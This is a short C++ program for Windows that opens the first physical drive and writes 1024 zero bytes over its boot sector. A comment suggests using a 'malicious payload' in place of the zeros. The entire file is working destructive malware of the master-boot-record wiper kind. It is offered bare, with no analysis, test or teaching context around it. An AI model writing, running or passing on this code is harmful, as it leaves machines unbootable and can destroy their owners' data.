#include <iostream>
#include <windows.h>

#define MBR_SIZE 1024 // 512 = Legacy MBR, 1024 = GUID Partition Table

void overwriteMBR(const char* junkData) {
    DWORD bytesWritten;
    HANDLE hDevice = CreateFileA(
        "\\\\.\\PhysicalDrive0",   // PhysicalDrive0 targets the primary drive
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Error: Unable to access the disk. Run as Administrator." << std::endl;
        return;
    }

    BOOL success = WriteFile(
        hDevice,
        junkData,       // Data to write (junk)
        MBR_SIZE,       // Size of the MBR
        &bytesWritten,
        NULL
    );

    if (!success) {
        std::cerr << "Error: Failed to overwrite the MBR." << std::endl;
    } else {
        std::cout << "Success: MBR has been overwritten!" << std::endl;
    }

    CloseHandle(hDevice);
}

int main() {
    // Data to overwrite the MBR with (junk or malicious payload)
    char junkData[MBR_SIZE] = {0};  // Overwrite with 0x00 or any other data
    overwriteMBR(junkData);

    return 0;
}
